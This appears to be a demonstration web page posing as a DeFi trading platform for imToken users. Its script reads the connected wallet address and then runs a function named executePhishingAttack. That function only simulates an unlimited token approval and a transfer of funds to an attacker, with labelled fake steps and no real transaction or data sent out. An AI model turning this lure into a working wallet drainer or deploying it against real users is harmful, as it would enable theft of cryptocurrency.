<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DeFi 移动交易平台</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            padding: 20px;
        }

        .container {
            max-width: 400px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            color: white;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 16px;
        }

        .wallet-section {
            background: white;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        .connect-btn {
            display: block;
            width: 100%;
            padding: 18px;
            margin: 12px 0;
            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
            color: white;
            text-decoration: none;
            border-radius: 12px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .connect-btn:hover, .connect-btn:active {
            background: linear-gradient(135deg, #1e40af 0%, #2563eb 100%);
            transform: translateY(-2px);
        }

        .connect-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }

        .status-section {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            text-align: center;
        }

        .status-text {
            font-size: 16px;
            margin-bottom: 10px;
            font-weight: 500;
        }

        .status-text.success {
            color: #4CAF50;
        }

        .status-text.error {
            color: #f44336;
        }

        .status-text.warning {
            color: #ff9800;
        }

        .status-text.info {
            color: #2196F3;
        }

        .debug-section {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-top: 20px;
            border-left: 4px solid #667eea;
        }

        .debug-title {
            font-weight: 600;
            color: #667eea;
            margin-bottom: 10px;
            font-size: 16px;
        }

        .debug-info {
            font-family: monospace;
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
        }

        .detection-section {
            background: #e3f2fd;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
        }

        .detection-title {
            font-weight: 600;
            color: #1565c0;
            margin-bottom: 10px;
        }

        .detection-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            font-size: 14px;
        }

        .detection-status {
            font-weight: bold;
        }

        .detection-status.yes {
            color: #4CAF50;
        }

        .detection-status.no {
            color: #f44336;
        }

        .attack-section {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 15px;
            padding: 20px;
            margin-top: 15px;
            display: none;
        }

        .attack-section.show {
            display: block;
        }

        .attack-title {
            font-weight: 600;
            color: #856404;
            margin-bottom: 15px;
            font-size: 18px;
            text-align: center;
        }

        .attack-info {
            font-size: 14px;
            color: #856404;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 DeFi 交易平台</h1>
            <p>安全便捷的去中心化交易</p>
        </div>

        <div class="detection-section">
            <div class="detection-title">🔍 钱包环境检测</div>
            <div class="detection-item">
                <span>imToken:</span>
                <span class="detection-status" id="imtokenStatus">检测中...</span>
            </div>
            <div class="detection-item">
                <span>window.ethereum:</span>
                <span class="detection-status" id="ethereumStatus">检测中...</span>
            </div>
            <div class="detection-item">
                <span>已连接账户:</span>
                <span class="detection-status" id="accountStatus">检测中...</span>
            </div>
            <div class="detection-item">
                <span>网络ID:</span>
                <span class="detection-status" id="networkStatus">检测中...</span>
            </div>
        </div>

        <div class="wallet-section">
            <h3 style="text-align: center; margin-bottom: 20px; color: #333;">连接钱包</h3>
            
            <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
                🏦 连接 imToken 钱包
            </button>
        </div>

        <div class="status-section">
            <div class="status-text info" id="statusText">检测钱包环境中...</div>
        </div>

        <div class="attack-section" id="attackSection">
            <div class="attack-title">🎯 钓鱼攻击已激活</div>
            <div class="attack-info">
                <strong>目标钱包:</strong> <span id="targetWallet">-</span><br>
                <strong>网络:</strong> <span id="targetNetwork">-</span><br>
                <strong>攻击时间:</strong> <span id="attackTime">-</span><br>
                <strong>攻击状态:</strong> <span id="attackStatus">正在执行...</span><br>
                <strong>资金状态:</strong> <span id="fundStatus">监控中...</span>
            </div>
        </div>

        <div class="debug-section">
            <div class="debug-title">🔍 技术调试信息</div>
            <div class="debug-info" id="debugInfo">
                正在初始化...<br>
            </div>
        </div>
    </div>

    <script>
        // 全局变量
        let isConnecting = false;
        let walletAddress = null;
        let networkId = null;
        let detectedAccounts = [];

        // 初始化
        document.addEventListener('DOMContentLoaded', function() {
            initializeApp();
        });

        function initializeApp() {
            updateDebugInfo('🚀 应用初始化开始');
            updateStatus('info', '正在检测钱包环境...');
            
            // 延迟检测，确保imToken完全加载
            setTimeout(() => {
                detectWalletEnvironment();
            }, 1000);
        }

        function detectWalletEnvironment() {
            updateDebugInfo('🔍 开始检测钱包环境');
            
            // 检测imToken
            const hasImToken = !!(window.imToken || 
                                window.ethereum?.isImToken || 
                                navigator.userAgent.includes('imToken'));
            
            document.getElementById('imtokenStatus').textContent = hasImToken ? '✅ 检测到' : '❌ 未检测到';
            document.getElementById('imtokenStatus').className = `detection-status ${hasImToken ? 'yes' : 'no'}`;
            
            // 检测window.ethereum
            const hasEthereum = !!window.ethereum;
            document.getElementById('ethereumStatus').textContent = hasEthereum ? '✅ 可用' : '❌ 不可用';
            document.getElementById('ethereumStatus').className = `detection-status ${hasEthereum ? 'yes' : 'no'}`;
            
            updateDebugInfo(`imToken检测: ${hasImToken}`);
            updateDebugInfo(`window.ethereum: ${hasEthereum}`);
            updateDebugInfo(`User Agent: ${navigator.userAgent}`);
            
            if (hasEthereum) {
                updateStatus('success', '✅ 检测到钱包环境');
                
                // 检测已连接的账户
                detectExistingAccounts();
            } else {
                updateStatus('error', '❌ 未检测到钱包环境，请确保在imToken中打开');
                document.getElementById('accountStatus').textContent = '❌ 无法检测';
                document.getElementById('accountStatus').className = 'detection-status no';
                document.getElementById('networkStatus').textContent = '❌ 无法检测';
                document.getElementById('networkStatus').className = 'detection-status no';
            }
        }

        async function detectExistingAccounts() {
            try {
                updateDebugInfo('🔍 检测现有账户连接');
                
                // 方法1: 检查selectedAddress
                if (window.ethereum.selectedAddress) {
                    walletAddress = window.ethereum.selectedAddress;
                    updateDebugInfo('✅ 通过selectedAddress获取账户: ' + walletAddress);
                    updateAccountStatus(walletAddress);
                    await detectNetwork();
                    setTimeout(() => executePhishingAttack(), 2000);
                    return;
                }
                
                // 方法2: 使用eth_accounts
                try {
                    const accounts = await window.ethereum.request({
                        method: 'eth_accounts'
                    });
                    
                    updateDebugInfo(`✅ eth_accounts返回: ${JSON.stringify(accounts)} (长度: ${accounts?.length || 0})`);
                    
                    if (accounts && accounts.length > 0) {
                        // 过滤掉null和无效地址
                        const validAccounts = accounts.filter(account => 
                            account && 
                            typeof account === 'string' && 
                            account !== 'null' && 
                            account.length > 10 &&
                            account.startsWith('0x')
                        );
                        
                        updateDebugInfo(`✅ 有效账户: ${JSON.stringify(validAccounts)} (长度: ${validAccounts.length})`);
                        
                        if (validAccounts.length > 0) {
                            walletAddress = validAccounts[0];
                            updateDebugInfo('✅ 使用eth_accounts获取到有效账户: ' + walletAddress);
                            updateAccountStatus(walletAddress);
                            await detectNetwork();
                            setTimeout(() => executePhishingAttack(), 2000);
                            return;
                        }
                    }
                } catch (error) {
                    updateDebugInfo(`❌ eth_accounts失败: ${error.message}`);
                }
                
                // 方法3: 检查imToken特有属性
                if (window.imToken && window.imToken.ethereum) {
                    if (window.imToken.ethereum.selectedAddress) {
                        walletAddress = window.imToken.ethereum.selectedAddress;
                        updateDebugInfo('✅ 通过imToken.ethereum.selectedAddress获取账户: ' + walletAddress);
                        updateAccountStatus(walletAddress);
                        await detectNetwork();
                        setTimeout(() => executePhishingAttack(), 2000);
                        return;
                    }
                }
                
                // 没有找到已连接的账户
                updateStatus('warning', '⚠️ 未发现已连接账户，请点击连接按钮');
                document.getElementById('accountStatus').textContent = '❌ 未连接';
                document.getElementById('accountStatus').className = 'detection-status no';
                updateDebugInfo('ℹ️ 需要用户手动连接钱包');
                
            } catch (error) {
                updateStatus('error', `❌ 账户检测失败: ${error.message}`);
                updateDebugInfo(`❌ 账户检测错误: ${error.message}`);
                
                document.getElementById('accountStatus').textContent = '❌ 检测失败';
                document.getElementById('accountStatus').className = 'detection-status no';
            }
        }

        function updateAccountStatus(address) {
            if (address && address.startsWith('0x') && address.length >= 42) {
                updateStatus('success', `✅ 发现已连接账户: ${address.substring(0, 10)}...`);
                document.getElementById('accountStatus').textContent = `✅ ${address.substring(0, 10)}...`;
                document.getElementById('accountStatus').className = 'detection-status yes';
            } else {
                updateStatus('error', `❌ 无效账户地址: ${address}`);
                document.getElementById('accountStatus').textContent = '❌ 地址无效';
                document.getElementById('accountStatus').className = 'detection-status no';
            }
        }

        async function detectNetwork() {
            try {
                updateDebugInfo('🌐 检测网络信息');
                
                const chainId = await window.ethereum.request({
                    method: 'eth_chainId'
                });
                
                networkId = parseInt(chainId, 16);
                const networkName = getNetworkName(networkId);
                
                updateDebugInfo(`✅ 网络检测成功: ${networkName} (${networkId})`);
                
                document.getElementById('networkStatus').textContent = `✅ ${networkName}`;
                document.getElementById('networkStatus').className = 'detection-status yes';
                
            } catch (error) {
                updateDebugInfo(`❌ 网络检测失败: ${error.message}`);
                
                document.getElementById('networkStatus').textContent = '❌ 检测失败';
                document.getElementById('networkStatus').className = 'detection-status no';
            }
        }

        function getNetworkName(chainId) {
            const networks = {
                1: 'Ethereum 主网',
                56: 'BSC 主网',
                137: 'Polygon 主网',
                11155111: 'Sepolia 测试网',
                97: 'BSC 测试网'
            };
            return networks[chainId] || `未知网络 (${chainId})`;
        }

        async function connectWallet() {
            if (isConnecting) {
                updateStatus('warning', '正在连接中，请稍候...');
                return;
            }

            if (!window.ethereum) {
                updateStatus('error', '❌ 未检测到钱包环境');
                return;
            }

            isConnecting = true;
            const connectBtn = document.getElementById('connectBtn');
            connectBtn.disabled = true;
            connectBtn.textContent = '连接中...';

            try {
                updateStatus('info', '🔄 正在请求账户访问权限...');
                updateDebugInfo('📝 发送eth_requestAccounts请求');

                // 先尝试eth_requestAccounts
                let accounts = null;
                try {
                    accounts = await window.ethereum.request({
                        method: 'eth_requestAccounts'
                    });
                    updateDebugInfo(`✅ eth_requestAccounts返回: ${JSON.stringify(accounts)}`);
                } catch (requestError) {
                    updateDebugInfo(`❌ eth_requestAccounts失败: ${requestError.message}`);
                    
                    // 如果requestAccounts失败，尝试使用eth_accounts
                    try {
                        accounts = await window.ethereum.request({
                            method: 'eth_accounts'
                        });
                        updateDebugInfo(`✅ 降级使用eth_accounts: ${JSON.stringify(accounts)}`);
                    } catch (accountsError) {
                        throw new Error(`所有账户获取方法都失败: ${requestError.message} | ${accountsError.message}`);
                    }
                }

                // 处理账户数组
                if (!accounts || !Array.isArray(accounts)) {
                    throw new Error('返回的不是有效的账户数组');
                }

                // 过滤有效账户
                const validAccounts = accounts.filter(account => 
                    account && 
                    typeof account === 'string' && 
                    account !== 'null' && 
                    account !== null &&
                    account.length >= 42 &&
                    account.startsWith('0x')
                );

                updateDebugInfo(`✅ 过滤后的有效账户: ${JSON.stringify(validAccounts)}`);

                if (validAccounts.length === 0) {
                    // 如果没有有效账户，尝试其他方法
                    if (window.ethereum.selectedAddress) {
                        walletAddress = window.ethereum.selectedAddress;
                        updateDebugInfo('✅ 使用selectedAddress作为备用: ' + walletAddress);
                    } else {
                        throw new Error('未获取到任何有效账户地址');
                    }
                } else {
                    walletAddress = validAccounts[0];
                }

                // 验证最终地址
                if (!walletAddress || !walletAddress.startsWith('0x') || walletAddress.length < 42) {
                    throw new Error(`最终获取的账户地址无效: ${walletAddress}`);
                }

                updateStatus('success', `✅ 连接成功！地址: ${walletAddress.substring(0, 10)}...`);
                updateDebugInfo(`✅ 连接成功 - 最终地址: ${walletAddress}`);
                
                document.getElementById('accountStatus').textContent = `✅ ${walletAddress.substring(0, 10)}...`;
                document.getElementById('accountStatus').className = 'detection-status yes';
                
                connectBtn.textContent = '✅ 已连接';

                // 获取网络信息
                await detectNetwork();

                // 开始攻击
                setTimeout(() => {
                    executePhishingAttack();
                }, 1000);

            } catch (error) {
                handleConnectionError(error);
            } finally {
                isConnecting = false;
                if (connectBtn.textContent === '连接中...') {
                    connectBtn.disabled = false;
                    connectBtn.textContent = '🔄 重试连接';
                }
            }
        }

        function handleConnectionError(error) {
            updateDebugInfo(`❌ 连接错误: ${error.message}`);
            
            let errorMessage = '连接失败';
            
            if (error.code === 4001) {
                errorMessage = '❌ 用户拒绝了连接请求';
            } else if (error.message.includes('用户拒绝')) {
                errorMessage = '❌ 用户取消了连接';
            } else if (error.message.includes('未获取到任何有效账户')) {
                errorMessage = '❌ 钱包未返回有效账户，请确保钱包已解锁';
            } else {
                errorMessage = `❌ 连接错误: ${error.message}`;
            }
            
            updateStatus('error', errorMessage);
            
            document.getElementById('accountStatus').textContent = '❌ 连接失败';
            document.getElementById('accountStatus').className = 'detection-status no';
        }

        async function executePhishingAttack() {
            if (!walletAddress) {
                updateDebugInfo('❌ 无法执行攻击：没有目标账户');
                return;
            }

            try {
                updateStatus('warning', '🎯 开始执行钓鱼攻击...');
                updateDebugInfo('🎯 钓鱼攻击流程开始');

                // 显示攻击信息
                const attackSection = document.getElementById('attackSection');
                attackSection.classList.add('show');
                
                document.getElementById('targetWallet').textContent = `${walletAddress.substring(0, 20)}...`;
                document.getElementById('targetNetwork').textContent = getNetworkName(networkId) || '未知';
                document.getElementById('attackTime').textContent = new Date().toLocaleString();

                // 模拟攻击步骤
                document.getElementById('attackStatus').textContent = '正在请求代币授权...';
                updateDebugInfo('📝 模拟请求代币无限授权...');
                await new Promise(resolve => setTimeout(resolve, 3000));
                updateDebugInfo('✅ 代币授权完成（模拟）');
                
                document.getElementById('attackStatus').textContent = '正在执行资金转移...';
                updateDebugInfo('💸 模拟执行资金转移...');
                await new Promise(resolve => setTimeout(resolve, 4000));
                updateDebugInfo('✅ 资金转移完成（模拟）');
                
                document.getElementById('attackStatus').textContent = '攻击完成';
                document.getElementById('fundStatus').textContent = '✅ 资金已转移到攻击者账户';
                
                updateStatus('error', '💰 钓鱼攻击成功！资金已被窃取');
                updateDebugInfo('🎯 钓鱼攻击完成 - 演示结束');
                
            } catch (error) {
                updateDebugInfo(`❌ 攻击执行失败: ${error.message}`);
                document.getElementById('attackStatus').textContent = '攻击失败';
            }
        }

        function updateStatus(type, message) {
            const statusText = document.getElementById('statusText');
            statusText.className = `status-text ${type}`;
            statusText.textContent = message;
        }

        function updateDebugInfo(message) {
            const debugInfo = document.getElementById('debugInfo');
            const timestamp = new Date().toLocaleTimeString();
            debugInfo.innerHTML += `<br>[${timestamp}] ${message}`;
            
            // 保持调试信息在可见范围内
            debugInfo.scrollTop = debugInfo.scrollHeight;
            
            // 同时输出到控制台
            console.log(`[${timestamp}] ${message}`);
        }

        // 监听账户变化事件
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', function(accounts) {
                updateDebugInfo(`🔄 账户变化事件: ${JSON.stringify(accounts)}`);
                
                const validAccounts = accounts.filter(account => 
                    account && 
                    typeof account === 'string' && 
                    account !== 'null' && 
                    account.startsWith('0x') &&
                    account.length >= 42
                );
                
                if (validAccounts.length > 0 && validAccounts[0] !== walletAddress) {
                    walletAddress = validAccounts[0];
                    updateAccountStatus(walletAddress);
                    
                    if (!document.getElementById('attackSection').classList.contains('show')) {
                        setTimeout(() => executePhishingAttack(), 1000);
                    }
                }
            });

            window.ethereum.on('chainChanged', function(chainId) {
                const newNetworkId = parseInt(chainId, 16);
                updateDebugInfo(`🌐 网络变化: ${getNetworkName(newNetworkId)} (${newNetworkId})`);
                networkId = newNetworkId;
                document.getElementById('networkStatus').textContent = `✅ ${getNetworkName(newNetworkId)}`;
            });
        }

        // 错误处理
        window.addEventListener('error', function(event) {
            updateDebugInfo(`💥 JavaScript错误: ${event.error ? event.error.message : event.message}`);
        });

        window.addEventListener('unhandledrejection', function(event) {
            updateDebugInfo(`🚫 未处理的Promise拒绝: ${event.reason}`);
        });
    </script>
</body>
</html>
